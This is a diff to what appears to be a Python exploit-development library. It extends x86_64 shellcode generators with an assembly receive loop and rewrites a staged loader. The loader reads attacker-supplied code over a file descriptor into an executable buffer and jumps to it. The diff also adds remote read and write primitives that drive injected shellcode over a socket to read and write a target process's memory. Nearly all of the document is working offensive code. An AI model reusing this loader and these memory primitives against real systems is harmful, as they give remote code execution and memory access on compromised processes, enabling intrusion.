@@ -380,7 +380,6 @@ class x86_64_shellcode:
         assert '\0' not in res
         return res
 
-
     @staticmethod
     def _read_write(fd, buf, sz, syscall):
         return "".join((
@@ -402,9 +401,30 @@ class x86_64_shellcode:
         return x86_64_shellcode._read_write(fd, buf, sz, 0)
 
     @staticmethod
+    def _read_send_loop(buf_reg, sz_reg, fd=0, syscall=0):
+        return """
+        recvloop:
+            test {sz_reg}, {sz_reg}
+            jz recvloop_end
+            mov rdi, {fd}
+            mov rsi, {buf_reg}
+            mov rdx, {sz_reg}
+            mov rax, {syscall}
+            syscall
+            cmp rax, 0
+            jge cont
+            int3
+        cont:
+            add {buf_reg}, rax
+            sub {sz_reg}, rax
+            jmp recvloop
+        recvloop_end:
+            """.format(buf_reg=buf_reg, sz_reg=sz_reg, fd=fd, syscall=syscall)
+
+    @staticmethod
     def loader(rwx_buf, fd=0):
         # TODO make a proper recvloop to account for segmentation
-        return x86_64.assemble("""
+        return x86_64.assemble(("""
         start:
             mov rdi, {fd}
             pop rsi
@@ -412,16 +432,16 @@ class x86_64_shellcode:
             mov rdx, 8
             mov rax, 0   ; sys_read
             syscall
-            mov rdi, {fd}
-            mov rdx, {buf}
-            mov rdx, [rdx]
-            mov rsi, {buf}
-            mov rax, 0   ; sys_read
-            syscall
+
+            mov r9, {buf}
+            mov r10, [r9]
+            """ +
+            x86_64_shellcode._read_send_loop("r9", "r10", "{fd}", 0) +
+            """
             mov rax, {buf}
             call rax
             jmp short start
-            """.format(fd=fd, buf=rwx_buf))
+            """).format(fd=fd, buf=rwx_buf))
 
 for c in [x86_shellcode, x86_64_shellcode]:
     for k, sc in c.__dict__.items():
@@ -441,15 +461,14 @@ class Remote_x86_64(object):
 
     def read(self, addr, sz):
         self.execute(x86_64.assemble("""
-            mov rdi, {fd_out}
-            mov rsi, {addr}
-            mov rdx, {sz}
-            mov rax, 1   ; sys_write
-            syscall
-            """.format(addr=addr, sz=sz, fd_out=self.fd_out)))
-        return self.sock.recv(4096)
+            mov r9, {addr}
+            mov r10, {sz}
+            """.format(addr=addr, sz=sz) +
+            x86_64_shellcode._read_send_loop("r9", "r10", self.fd_out, 1)
+            ))
+        return read_all(self.sock, sz)
 
-    def readstr(self, addr):
+    def read_str(self, addr):
         res = ""
         while True:
             c = self.read(addr, 1)
@@ -458,14 +477,22 @@ class Remote_x86_64(object):
             res += c
             addr += 1
 
+    def read_struct(self, addr, fmt):
+        return struct.unpack(fmt, self.read(addr, struct.calcsize(fmt)))
+
+    def read4(self, addr):
+        return self.read_struct(addr, "I")[0]
+
+    def read8(self, addr):
+        return self.read_struct(addr, "Q")[0]
+
     def write(self, addr, data):
         self.execute(x86_64.assemble("""
-            mov rdi, {fd_in}
-            mov rsi, {addr}
-            mov rdx, {sz}
-            mov rax, 0   ; sys_read
-            syscall
-            """.format(addr=addr, sz=len(data), fd_in=self.fd_in)))
+            mov r9, {addr}
+            mov r10, {sz}
+            """.format(addr=addr, sz=len(data)) +
+            x86_64_shellcode._read_send_loop("r9", "r10", self.fd_in, 0)
+            ))
         self.sock.sendall(data)
 
 libc = ctypes.CDLL("libc.so.6")
